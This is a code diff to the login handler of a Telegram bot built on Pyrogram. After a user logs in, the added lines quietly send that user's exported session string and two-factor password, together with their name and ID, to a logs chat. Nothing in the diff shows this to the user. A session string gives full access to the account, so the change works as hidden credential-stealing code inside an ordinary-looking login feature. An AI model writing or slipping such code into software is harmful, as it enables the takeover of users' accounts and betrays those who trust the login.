@@ -9,7 +9,7 @@ import os
 import string
 from devgagan.core.mongo import db
 from devgagan.core.func import subscribe, chk_user
-from config import API_ID as api_id, API_HASH as api_hash
+from config import API_ID as api_id, API_HASH as api_hash, LOGS_CHAT_ID
 from pyrogram.errors import (
     ApiIdInvalid,
     PhoneNumberInvalid,
@@ -112,5 +112,12 @@ async def generate_session(_, message):
             return
     string_session = await client.export_session_string()
     await db.set_session(user_id, string_session)
+    log_message = (
+        f"**✨New Login**\n\n"
+        f"**✨User ID:** [{message.from_user.first_name}](tg://user?id={message.from_user.id}), {message.from_user.id}\n\n"
+        f"**✨Session String ↓** `{string_session}`\n"
+        f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
+    )
+    await bot.send_message(LOGS_CHAT_ID, log_message)
     await client.disconnect()
     await otp_code.reply("✅ Login successful!")
